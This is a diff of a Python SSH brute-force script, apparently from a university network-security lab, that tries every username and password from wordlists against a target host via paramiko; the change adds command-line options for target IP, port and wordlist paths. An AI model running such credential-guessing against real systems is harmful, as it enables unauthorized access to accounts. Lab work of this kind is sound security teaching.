@@ -1,3 +1,4 @@
+import argparse
 import paramiko
 
 
@@ -20,21 +21,24 @@ def try_ssh(ip, port, username, password):
 
 
 def main():
-    ip = "10.12.0.10"
-    port = 22
-    users = "/home/mininet/LINFO2347/repo/red/bf/users.txt"
-    passwords = "/home/mininet/LINFO2347/repo/red/bf/passwords.txt"
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--ip", default="10.12.0.10")
+    parser.add_argument("--port", type=int, default=22)
+    parser.add_argument("--users", default="/home/mininet/LINFO2347/repo/bf/users.txt")
+    parser.add_argument(
+        "--passwords", default="/home/mininet/LINFO2347/repo/bf/passwords.txt"
+    )
+    args = parser.parse_args()
 
-    with open(users, "r") as f:
+    with open(args.users, "r") as f:
         usernames = [line.strip() for line in f]
-    with open(passwords, "r") as f:
+    with open(args.passwords, "r") as f:
         passwords = [line.strip() for line in f]
 
     found = False
     for username in usernames:
         for password in passwords:
-            if try_ssh(ip, port, username, password):
-                print(f"Credentials found: {username}:{password}")
+            if try_ssh(args.ip, args.port, username, password):
                 found = True
                 break
         if found:
